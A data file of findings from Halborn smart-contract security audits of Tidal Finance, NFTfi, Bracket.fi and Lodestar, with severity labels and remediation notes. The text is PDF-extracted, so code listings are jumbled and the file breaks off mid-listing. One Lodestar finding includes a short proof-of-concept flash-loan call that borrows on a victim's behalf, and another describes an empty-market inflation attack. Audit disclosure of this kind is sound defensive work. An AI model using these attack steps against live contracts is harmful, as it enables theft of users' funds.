        "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Code Location: Staking.sol Line #259 Listing 10: Staking.sol (Lines 259) 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 function claim () external { UserInfo storage user = userInfo [ _msgSender () ]; updatePool () ; uint256 pending = user . amount . mul ( poolInfo . accRewardPerShare ). div ( UNIT_PER_SHARE ). sub ( user . rewardDebt ); uint256 rewardTotal = user . rewardAmount . add ( pending ); IERC20 ( registry . tidalToken () ). transfer ( _msgSender () , rewardTotal ); user . rewardAmount = 0; user . rewardDebt = user . amount . mul ( poolInfo . accRewardPerShare ). div ( UNIT_PER_SHARE ); emit Claim ( _msgSender () , rewardTotal ); } 27 Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the Staking.sol , the claim() function is missing nonReentrant guard. Use the nonReentrant or mutex modifier to avoid introducing future vulnerabilities. Remediation Plan: SOLVED: 7984f69a292180c9393b4eedeeef40ef5217d2e1. Tidal.Finance added Re-entrancy protection in commit 28 ",
        "labels": [
            "Halborn",
            "Tidal_Finances",
            "Severity: Informational"
        ]
    },
    {
        "title": "BLOCK TIMESTAMP ALIAS USAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Tidal_Finance_Smart_Contracts_Security_Audit_Halborn_v1_1.pdf",
        "body": "The global variable now alias of the block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of now to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: WeekManaged.sol Line #11,15 Listing 11: WeekManaged.sol (Lines 11,15) function _timeExtra () internal virtual view returns ( uint256 ); function getCurrentWeek () public view returns ( uint256 ) { return ( now + offset + _timeExtra () ) / (7 days ); uint256 public offset = 4 days ; } 4 abstract contract WeekManaged { 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 } } function getNow () public view returns ( uint256 ) { return now + _timeExtra () ; function getUnlockWeek () public view returns ( uint256 ) { return getCurrentWeek () + 2; function getUnlockTime ( uint256 time_ ) public view returns ( 23 uint256 ) { require ( time_ + offset > (7 days ) , \" Time not large enough \" ); 29 return (( time_ + offset ) / (7 days ) + 2) * (7 days ) - offset ; 24 25 26 } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use block.number instead of now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: Tidal.Finance considers it appropriate to use block. timestamp for their business logic. In addition, the timescale used in the project is higher than 900 seconds. 30 3.10 (HAL-10) POSSIBLE MISUSE OF PUBLIC FUNCTIONS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Tidal_Finances",
            "Severity: Informational"
        ]
    },
    {
        "title": "GAS OVER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_eth_nftfi_Collection_Offer_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In all the loops, the counter variable is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: DirectLoanBaseMinimal.sol - Line 305: for (uint256 i = 0; i < _permittedErc20s.length; i++){ - Line 374: for (uint256 i = 0; i < _erc20s.length; i++){ Proof of Concept: For example, based in the following test contract: Listing 1: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in the gas costs: 12 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop to save some gas. This is not applicable outside of loops. Remediation Plan: ACKNOWLEDGED: The \\client team acknowledged this issue. 13 ",
        "labels": [
            "Halborn",
            "NFTfi_eth_nftfi_Collection_Offer",
            "Severity: Informational"
        ]
    },
    {
        "title": "SOLC 0.8.4 COMPILER VERSION CONTAINS MULTIPLE BUGS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_eth_nftfi_Collection_Offer_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Presently, the smart contracts have configured the floating pragma set to 0.8.0 or fixed pragma to 0.8.4 (e.g. DirectLoanFixedCollectionOffer .sol). The latest solidity compiler version 0.8.16 fixed important bugs in the compiler. The version 0.8.4 is missing all these fixes: 0.8.9, 0.8.13, 0.8.14, 0.8.15, 0.8.16. The official Soliditys recommendations are: when deploying contracts, you should use the latest released version of Solidity. Apart from exceptional cases, only the latest version receives security fixes. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to set the floating pragma at least to 0.8.16 version. Remediation Plan: ACKNOWLEDGED: The \\client team acknowledged this issue. 14 MANUAL TESTING 15 Halborn performed several manual tests in the DirectLoanFixedCollectionOffer .sol contract: G N I T S E T L A U N A M 16 G N I T S E T L A U N A M 17 G N I T S E T L A U N A M 18 The manual tests were focused on testing the main functions of this contract:  acceptOffer()  getPayoffAmount()  updateMaximumLoanDuration()  updateAdminFee()  drainERC20Airdrop()  setERC20Permit()  setERC20Permits()  drainERC721Airdrop()  drainERC1155Airdrop()  mintObligationReceipt()  renegotiateLoan()  payBackLoan()  liquidateOverdueLoan()  pullAirdrop()  wrapCollateral() G N I T S E T L A U N A M 19  cancelLoanCommitmentBeforeLoanHasBegun()  getWhetherNonceHasBeenUsedForUser()  getERC20Permit() No significant issues were found during the manual tests. G N I T S E T L A U N A M 20 ",
        "labels": [
            "Halborn",
            "NFTfi_eth_nftfi_Collection_Offer",
            "Severity: Informational"
        ]
    },
    {
        "title": "ERC",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Channel contract, when transferring the commission from the con- tract to the owner the transfer function is not wrapped with a require statement, meaning the return value of the transfer function is ignored. While failed USDC transfers are reverted, it is important to note that some failed ERC-20 token transfers may return a boolean false instead, which may lead to processing transactions that otherwise should be reverted. Listing 1: contracts/Channel.sol (Line 362) 362 IERC20 ( usdc ). transfer ( payable ( owner () ) , v. commishUSDC ); Risk Level: Likelihood - 1 Impact - 4 Recommendation: Wrap the transfer function with a require statement to ensure failed ERC20 token transfers are always reverted. Remediation Plan: SOLVED: ERC20 token transfers were wrapped with a require statement which the transaction revert unless transfer returns true. Commit ID: 6fe5621f23b7cd09bc4d3396b9573c18c154d36c. 16 ",
        "labels": [
            "Halborn",
            "Bracket_fi_Channels_and_EpochChannels",
            "Severity: Low"
        ]
    },
    {
        "title": "CENTRALIZATION RISK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The CNFT contract implements methods for the contract owner to mint and set policies. While the probability of this happening is very low, if the private keys of the owner account are compromised, a malicious user could potentially mint NFTs and use the setPolicy() function to steal other users policies. Listing 2: contracts/CNFT.sol (Line 56) external onlyBrkt 56 function setPolicy ( uint256 tokenId , ChanLib . CPolicy memory policy ) 57 58 59 { 60 61 } Policies [ tokenId ] = policy ; Risk Level: Likelihood - 1 Impact - 2 Recommendation: Remove the owner from the onlyBrkt() modifier. Remediation Plan: SOLVED: The contract owner was removed from the onlyBrkt modifier. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 17 ",
        "labels": [
            "Halborn",
            "Bracket_fi_Channels_and_EpochChannels",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMMUTABLE DEPENDENCIES OF THE EPOCH CHANNELS CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the EpochChannels contract, the addresses of the pricing contract and the Ethereum/USD Price Feed Oracle is set on initialization. How- ever, these addresses cannot be changed later on if those contracts are deprecated or their private keys are compromised. Listing 3: contracts/EpochChannels.sol (Line 70) __Ownable_init () ; __Pausable_init () ; __ReentrancyGuard_init () ; require ( _pricing != address (0) && _eth != address (0) , \" ZADDR \" ) 70 function initialize ( address _pricing , address _eth ) external  initializer { 71 72 73 74  ; 75 76 pricing = _pricing ; ETH = _eth ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Implement a function to change the dependencies addresses. Remediation Plan: SOLVED: The Bracket team added the cngLinks functions to change dependency addresses. 18 Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 19 ",
        "labels": [
            "Halborn",
            "Bracket_fi_Channels_and_EpochChannels",
            "Severity: Informational"
        ]
    },
    {
        "title": "HARDCODED STATE VARIABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the EpochChannels contract, the minimum USD amount a user can invest in an Epoch Channel MIN_BUY_USD is hardcoded into the initialize function. Moreover, unlike other parameters, there is no setter function to change this parameter. In case this value needs to be changed, the contract needs to be redeployed. . Listing 4: contracts/EpochChannels.sol (Line 70) __Ownable_init () ; __Pausable_init () ; __ReentrancyGuard_init () ; require ( _pricing != address (0) && _eth != address (0) , \" ZADDR \" ) 70 function initialize ( address _pricing , address _eth ) external  initializer { 71 72 73 74  ; 75 76 77 78 79 80 81 82 pricing = _pricing ; ETH = _eth ; COMMISH = 975 e15 ; // 1 - 2.5% in 18 digits MAX_MULT = 19; MAX_DELAY = 180; // 3 min MIN_BUY_USD = 9 e18 ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Implement a setter function for the MIN_BUY_USD state variable. 20 Remediation Plan: SOLVED: The Bracket team added the setMinBuyUSD function to change the MIN_BUY_USD state variable. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 21 ",
        "labels": [
            "Halborn",
            "Bracket_fi_Channels_and_EpochChannels",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Missing several zero address checks within the code base can lead to accidentally setting the eth or channel address to the 0 address. Code Location:  ChanConfig.sol: setEth(), initialize()  CNFT.sol: setChannel()  ChanMaxKeeper.sol: initialize(), cngLinks  ChanKeeper.sol: initialize(), cngLinks  ChanOffers.sol: cngLinks()  PriceProd.sol: initialize() Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add a require() check for zero address for the addresses that impact core functionality and can lead to losses. Remediation Plan: SOLVED: The Bracket team implemented several zero address checks in above code locations. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 22 ",
        "labels": [
            "Halborn",
            "Bracket_fi_Channels_and_EpochChannels",
            "Severity: Informational"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract The contracts in scope use the floating pragma ^0.8.12. should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Listing 5: contracts/EpochChannels.sol (Line 1) 1 // SPDX - License - Identifier : apache -2.0 2 pragma solidity 0.8.12; Remediation Plan: SOLVED: The pragma was modified to specify a fixed compiler version. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 23 ",
        "labels": [
            "Halborn",
            "Bracket_fi_Channels_and_EpochChannels",
            "Severity: Informational"
        ]
    },
    {
        "title": "> 0 CONSUMES MORE GAS THAN != 0 FOR UINTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_Channels_and_EpochChannels_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The use of > sign consumes more gas than != sign. There are some cases where both can be used indistinctly, such as in unsigned integers where numbers cannot be negative, and as such, there is only a need to check that a number is not 0. Code Location: EpochChannel.sol: - Line 133, 171 and 193: require(_epoch > 0... - Line 230: require(_invId > 0... - Line 248: if (amt > 0){... Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use != instead of > in cases where both can be used. Remediation Plans: SOLVED: > 0 was replaced by != 0 for uint comparison, where both can be used interchangeably. Commit ID: 7aa426ee0a8f367aca5875267d9872bac05ec17d. 24 MANUAL TESTING 25 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 4.1 RE-ENTRANCY ATTACKS ",
        "labels": [
            "Halborn",
            "Bracket_fi_Channels_and_EpochChannels",
            "Severity: Informational"
        ]
    },
    {
        "title": "ANY USER CAN BORROW ON BEHALF OF ANOTHER USER THAT APPROVED THE PLOOPY CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the Ploopy contract, the receiveFlashLoan() function is used to handle all the logic when a flash loan is received from the Balancer contract: Listing 1: Ploopy.sol (Line 170) IERC20 [] memory tokens , uint256 [] memory amounts , uint256 [] memory feeAmounts , bytes memory userData 164 function receiveFlashLoan ( 165 166 167 168 169 ) external override nonReentrant { 170 if ( msg . sender != address ( BALANCER_VAULT )) revert UNAUTHORIZED ( '  balancer vault is not the sender '); 171 172 173 174 175 // additional checks ? UserData memory data = abi . decode ( userData , ( UserData )) ; if ( data . borrowedAmount != amounts [0] || data . borrowedToken !=  tokens [0]) revert FAILED ( ' borrowed amounts and / or borrowed tokens  do not match initially set values '); 176 177 178 179 180 181 182 183 184 185 186 // sanity check : flashloan has no fees if ( feeAmounts [0] > 0) revert FAILED ( ' balancer fee > 0 '); // account for some plvGLP specific logic if ( data . tokenToLoop == PLVGLP ) { // mint GLP . approval needed . uint256 glpAmount = REWARD_ROUTER_V2 . mintAndStakeGlp ( address ( data . borrowedToken ) , data . borrowedAmount , 0, 24 187 188 189 190 191 192 193 194 195 196 197 198 199 0 ); if ( glpAmount == 0) revert FAILED ( ' glp =0 '); // TODO whitelist this contract for plvGLP mint // mint plvGLP . approval needed . uint256 _oldPlvglpBal = PLVGLP . balanceOf ( address ( this )) ; GLP_DEPOSITOR . deposit ( glpAmount ); // check new balances and confirm we properly minted uint256 _newPlvglpBal = PLVGLP . balanceOf ( address ( this )) ; emit plvGLPBalance ( _newPlvglpBal ); require ( _newPlvglpBal > _oldPlvglpBal , \" glp deposit failed ,  new balance < old balance \" ); 200 201 202 203 204 } uint256 _finalBal ; // mint our respective token by depositing it into Lodestar 's  respective lToken contract ( approval needed ) 205 206 unchecked { lTokenMapping [ data . tokenToLoop ]. mint ( data . tokenToLoop .  balanceOf ( address ( this )) ); 207 lTokenMapping [ data . tokenToLoop ]. transfer ( data . user ,  lTokenMapping [ data . tokenToLoop ]. balanceOf ( address ( this )) ); 208 _finalBal = lTokenMapping [ data . tokenToLoop ]. balanceOf ( address (  this )); 209 210 211 emit lTokenBalance ( _finalBal ); require ( _finalBal == 0 , \" lToken balance not 0 at the end of  loop \"); } 212 213 214 215 // call borrowBehalf to borrow tokens on behalf of user lTokenMapping [ data . tokenToLoop ]. borrowBehalf ( data . borrowedAmount  , data . user ); 216 217 // repay loan , where msg . sender = vault data . tokenToLoop . safeTransferFrom ( data . user , msg . sender , data .  borrowedAmount ); 218 } The receiveFlashLoan() function has some access control mechanism in place: This function can only be called by the Balancer contract. 25 Although, any user is free to call the balancer.flashLoan() function passing it the address of the Looper: Listing 2: flashLoan() call (Lines 2,10) user : victim_address , tokenAmount : 10000 _000000 , borrowedToken : contract_USDC , borrowedAmount : 10000 _000000 , tokenToLoop : contract_USDC 1 UserData memory userData = UserData ({ 2 3 4 5 6 7 }) ; 8 9 // Exploit call 10 BALANCER_VAULT . flashLoan ( IFlashLoanRecipient ( contract_Ploopy , [  USDC ], [10000 _000000 ], abi . encode ( userData )) ; Balancer contract would call back the Ploopy.receiveFlashLoan() function and trigger a borrow on behalf of another user: lTokenMapping[data.tokenToLoop].borrowBehalf(data.borrowedAmount, data. user); The consequences: 1. Lowering the account liquidity of the users, being able to get them very close to a liquidation. 2. If the attack is performed with the plvGLP token, this will trig- ger a REWARD_ROUTER_V2.mintAndStakeGlp(address(data.borrowedToken), data .borrowedAmount, 0, 0) call. As the borrowedAmount is a user controlled parameter and the slippage is set to 0, the attacker can sandwich this call to get profit constantly from different users in the Lodestar protocol. 26 Proof of Concept: BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:C/Y:N/R:N/S:U (10) Recommendation: is recommended Ploopy. It receiveFlashLoan() function that checks that tx.origin is equal to the userData.user field passed as parameter to this function. statement require add the to in a Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 306d538a0b295fb96b37ccd774c27fb658b0538f. 27 ",
        "labels": [
            "Halborn",
            "Lodestar_Lodestar_Finance",
            "Severity: Critical"
        ]
    },
    {
        "title": "CETHERDELEGATOR DELEGATECALLS SOME CETHERUPGRADEABLE FUNCTIONS INCORRECTLY, ALWAYS REVERTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The CEtherDelegator is used as a proxy contract for the CEtherDelegate contract. The CEtherDelegator contract delegate calls to the implemen- tation (CEtherDelegate). Although, some of the functions implemented in the CEtherDelegator contract delegate calls functions selectors that do not exist in the CEtherDelegate contract. For example: Listing 3: CEtherDelegator.sol (Line 89) delegateToImplementation ( abi . encodeWithSignature ( \" mint ( uint256 88 function mint () external payable override { 89  ) \" , msg . value )); 90 } Listing 4: CEtherUpgradeable.sol (Line 38) 38 function mint () external payable { mintInternal ( msg . value ); 39 40 } Listing 5: CEtherDelegator.sol (Line 157) 156 function repayBorrow () external payable override { 157 delegateToImplementation ( abi . encodeWithSignature ( \" repayBorrow (  uint256 ) \" , msg . value )) ; 28 158 } Listing 6: CEtherUpgradeable.sol (Line 78) 78 function repayBorrow () external payable { 79 repayBorrowInternal ( msg . value ); 80 } Listing 7: CEtherDelegator.sol (Line 157) 156 function repayBorrowBehalf ( address borrower ) external payable  override { 157 delegateToImplementation ( abi . encodeWithSignature ( \"  repayBorrowBehalf ( address , uint256 ) \" , borrower , msg . value )) ; 158 } Listing 8: CEtherUpgradeable.sol (Line 78) 78 function repayBorrowBehalf ( address borrower ) external payable { 79 80 } repayBorrowBehalfInternal ( borrower , msg . value ); Listing 9: CEtherDelegator.sol (Lines 175-177) 174 function liquidateBorrow ( address borrower , CTokenInterface  cTokenCollateral ) external payable override { 175 176 delegateToImplementation ( abi . encodeWithSignature ( \" liquidateBorrow ( address , address ) \"  , borrower , cTokenCollateral ) 177 178 } ); Listing 10: CEtherUpgradeable.sol (Line 122) 122 function liquidateBorrow ( address borrower , CToken cTokenCollateral  ) external payable returns ( uint ) { 123  ; 124 125 } liquidateBorrowInternal ( borrower , msg . value , cTokenCollateral ) return NO_ERROR ; 29 These function calls will always revert, leaving the CEtherDelegator unusable. Functions affected:  CEtherDelegator.mint()  CEtherDelegator.repayBorrow()  CEtherDelegator.repayBorrowBehalf()  CEtherDelegator.liquidateBorrow() Proof of Concept: BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:U (10) Recommendation: It is recommended to correct in the CEtherDelegator contract the different abi.encodeWithSignature() calls to use the correct function signatures. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : f62e743da12da115333ddedb25721cb9bde7f7d2. 30 ",
        "labels": [
            "Halborn",
            "Lodestar_Lodestar_Finance",
            "Severity: Critical"
        ]
    },
    {
        "title": "EMPTY MARKETS ARE VULNERABLE TO INFLATION ATTACKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "This vulnerability has existed in the Compound v2 code since its launch, presenting itself when markets are launched with a collateral value in place but no depositors or following markets becoming empty due to user withdrawal post-launch. This issue exploits a rounding error that is present in the redeemFresh() function: Listing 11: CToken.sol (Line 520) 490 /* * 491 * @notice User redeems cTokens in exchange for the underlying  asset 492 * @dev Assumes interest has already been accrued up to the  current block 493 * @param redeemer The address of the account which is redeeming  the tokens 494 * @param redeemTokensIn The number of cTokens to redeem into  underlying ( only one of redeemTokensIn or redeemAmountIn may be  non - zero ) 495 * @param redeemAmountIn The number of underlying tokens to  receive from redeeming cTokens ( only one of redeemTokensIn or  redeemAmountIn may be non - zero ) */ 496 497 function redeemFresh ( address payable redeemer , uint redeemTokensIn  , uint redeemAmountIn ) internal { 498 require ( redeemTokensIn == 0 || redeemAmountIn == 0 , \" one of  redeemTokensIn or redeemAmountIn must be zero \" ); 499 500 /* exchangeRate = invoke Exchange Rate Stored () */ 31 501 Exp memory exchangeRate = Exp ({ mantissa :  exchangeRateStoredInternal () }) ; 502 503 504 505 506 507 508 uint redeemTokens ; uint redeemAmount ; /* If redeemTokensIn > 0: */ if ( redeemTokensIn > 0) { /* * We calculate the exchange rate and the amount of  underlying to be redeemed : 509 510 511 512 513 redeemTokens = redeemTokensIn redeemAmount = redeemTokensIn x exchangeRateCurrent * * */ redeemTokens = redeemTokensIn ; redeemAmount = mul_ScalarTruncate ( exchangeRate ,  redeemTokensIn ); 514 515 516 } else { /* * We get the current exchange rate and calculate the  amount to be redeemed : * * */ redeemTokens = redeemAmountIn / exchangeRate redeemAmount = redeemAmountIn redeemTokens = div_ ( redeemAmountIn , exchangeRate ); redeemAmount = redeemAmountIn ; } /* Fail if redeem not allowed */ uint allowed = comptroller . redeemAllowed ( address ( this ) , 517 518 519 520 521 522 523 524 525  redeemer , redeemTokens ); 526 527 528 529 530 531 532 533 534 535 536 537 538 539 if ( allowed != 0) { revert RedeemComptrollerRejection ( allowed ); } /* Verify market 's block number equals current block number */ if ( accrualBlockNumber != getBlockNumber () ) { revert RedeemFreshnessCheck () ; } /* Fail gracefully if protocol has insufficient cash */ if ( getCashPrior () < redeemAmount ) { revert RedeemTransferOutNotPossible () ; } 32 540 541 542 543 544 545 546 // /////////////////////// // EFFECTS & INTERACTIONS // ( No safe failures beyond this point ) /* * We write the previously calculated values into storage . * Note : Avoid token reentrancy attacks by writing reduced  supply before external transfer . 547 548 549 */ totalSupply = totalSupply - redeemTokens ; accountTokens [ redeemer ] = accountTokens [ redeemer ] -  redeemTokens ; 550 551 552 /* * We invoke doTransferOut for the redeemer and the  redeemAmount . * 553 Note : The cToken must handle variations between ERC -20 and  ETH underlying . 554 555 * * On success , the cToken has redeemAmount less of cash . doTransferOut reverts if anything goes wrong , since we can  't be sure if side effects occurred . 556 557 558 559 560 561 562 563 564 */ doTransferOut ( redeemer , redeemAmount ); /* We emit a Transfer event , and a Redeem event */ emit Transfer ( redeemer , address ( this ) , redeemTokens ); emit Redeem ( redeemer , redeemAmount , redeemTokens ); /* We call the defense hook */ comptroller . redeemVerify ( address ( this ) , redeemer , redeemAmount  , redeemTokens ); 565 } This is achieved by donating a large amount of the underlying asset to the market contract, manipulating the exchangeRate. 33 Proof of Concept: References:  Hundred Finance Hack Post Mortem  Hundred Finance exploit example BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:N/D:C/Y:C/R:N/S:U (8.4) Recommendation: It is recommended to ensure that markets are never empty by minting small cToken (or equivalent) balances at the time of market creation, preventing the rounding error being used maliciously. A possible approach is following UniswapV2 implementation that permanently locks the first MINIMUM_LIQUIDITY tokens. 34 Remediation Plan: SOLVED: The Lodestar team is aware of this CompoundV2 issue and states that and have a team controlled wallet with some of each asset deposited in each market to always have a MINIMUM_LIQUIDITY in every market. Moreover, the Lodestar team updated the CToken implementation, so it ensures that there is always a minimum liquidity of 1e6 tokens in the market. Commit ID : 5bae12489d1bca1ae42265853f43d5749a4b0dc8. 35 ",
        "labels": [
            "Halborn",
            "Lodestar_Lodestar_Finance",
            "Severity: High"
        ]
    },
    {
        "title": "LOOPING WITH PLVGLP BORROWS USDC AND REPAYS WITH PLVGLP, ALWAYS REVERTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Lodestar_Finance_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The contract Ploopy allows looping with the following assets: - USDC: Borrows USDC, repays with USDC. - USDT: Borrows USDT, repays with USDT. - DAI: Borrows DAI, repays with DAI. - WBTC: Borrows WBTC, repays with WBTC. - FRAX: Borrows FRAX, repays with FRAX. - ARB: Borrows ARB, repays with ARB. - plvGLP: Borrows USDC, repays with plvGLP. As we can see below, when users loop with the plvGLP token, a different logic is performed: Listing 12: Ploopy.sol (Line 118) 112 function loop ( IERC20 _token , uint256 _amount , uint16 _leverage ,  uint16 _useWalletBalance ) external { 113 114 115 116 require ( allowedTokens [ _token ], \" token not allowed to loop \" ); require ( tx . origin == msg . sender , \" not an EOA \"); require ( _amount > 0, \" amount must be greater than 0 \" ); require ( _leverage >= DIVISOR && _leverage <= MAX_LEVERAGE , \"  invalid leverage , range must be between DIVISOR and MAX_LEVERAGE  values \"); 117 118 // if the user wants us to mint using their existing wallet  balance ( indiciated with 1) , then do so . 119 // otherwise , read their existing balance and flash loan to  increase their position 120 121 if ( _useWalletBalance == 1) { // transfer tokens to this contract so we can mint in 1 go . 36 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 _token . safeTransferFrom ( msg . sender , address ( this ) , _amount ); emit Transfer ( msg . sender , address ( this ) , _amount ); } uint256 loanAmount ; IERC20 _tokenToBorrow ; if ( _token == PLVGLP ) { uint256 _tokenPriceInEth ; uint256 _usdcPriceInEth ; uint256 _computedAmount ; // plvGLP borrows USDC to loop _tokenToBorrow = USDC ; _tokenPriceInEth = PRICE_ORACLE . getUnderlyingPrice ( address (  lTokenMapping [ _token ]) ); 137 _usdcPriceInEth = ( PRICE_ORACLE . getUnderlyingPrice ( address (  lUSDC )) / 1 e12 ); 138 _computedAmount = ( _amount * ( _tokenPriceInEth /  _usdcPriceInEth )); 139 140 141 142 143 144 145 loanAmount = getNotionalLoanAmountIn1e18 ( _computedAmount , _leverage ); } else { // the rest of the contracts just borrow whatever token is  supplied 146 147 148 _tokenToBorrow = _token ; loanAmount = getNotionalLoanAmountIn1e18 ( _amount , // we can just send over the exact amount , as we  are either looping stables or eth 149 150 151 152 153 _leverage ); } if ( _tokenToBorrow . balanceOf ( address ( BALANCER_VAULT )) <  loanAmount ) revert FAILED ( ' balancer vault token balance < loan '); 154 155 emit Loan ( loanAmount ); emit BalanceOf ( _tokenToBorrow . balanceOf ( address ( BALANCER_VAULT ))  , loanAmount ); 156 157 158 // check approval to spend USDC ( for paying back flashloan ). // possibly can omit to save gas as tx will fail with exceed 37  allowance anyway . 159 if ( _tokenToBorrow . allowance ( msg . sender , address ( this )) <  loanAmount ) revert INVALID_APPROVAL () ; 160 emit Allowance ( _tokenToBorrow . allowance ( msg . sender , address ( this  )) , loanAmount ); 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 IERC20 [] memory tokens = new IERC20 [](1) ; tokens [0] = _tokenToBorrow ; uint256 [] memory loanAmounts = new uint256 [](1) ; loanAmounts [0] = loanAmount ; UserData memory userData = UserData ({ user : msg . sender , tokenAmount : _amount , borrowedToken : _tokenToBorrow , borrowedAmount : loanAmount , tokenToLoop : _token }) ; emit UserDataEvent ( msg . sender , _amount , address ( _tokenToBorrow ) ,  loanAmount , address ( _token )) ; 176 177 BALANCER_VAULT . flashLoan ( IFlashLoanRecipient ( this ) , tokens ,  loanAmounts , abi . encode ( userData )); 178 } 179 180 In this case , the ` _tokenToBorrow ` will be USDC . Although , during  the repayment of the flashloan , the contract tries to repay with  plvGLP token instead of USDC : 181 ``` { language = solidity firstnumber = \" 164 \" caption = \" Ploopy . sol \"  hlines =214 -217} IERC20 [] memory tokens , uint256 [] memory amounts , uint256 [] memory feeAmounts , bytes memory userData 182 function receiveFlashLoan ( 183 184 185 186 187 ) external override nonReentrant { 188 if ( msg . sender != address ( BALANCER_VAULT )) revert UNAUTHORIZED ( '  balancer vault is not the sender '); 189 190 191 192 193 // additional checks ? UserData memory data = abi . decode ( userData , ( UserData )) ; if ( data . borrowedAmount != amounts [0] || data . borrowedToken != 38  tokens [0]) revert FAILED ( ' borrowed amounts and / or borrowed tokens  do not match initially set values '); 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 // sanity check : flashloan has no fees if ( feeAmounts [0] > 0) revert FAILED ( ' balancer fee > 0 '); // account for some plvGLP specific logic if ( data . tokenToLoop == PLVGLP ) { // 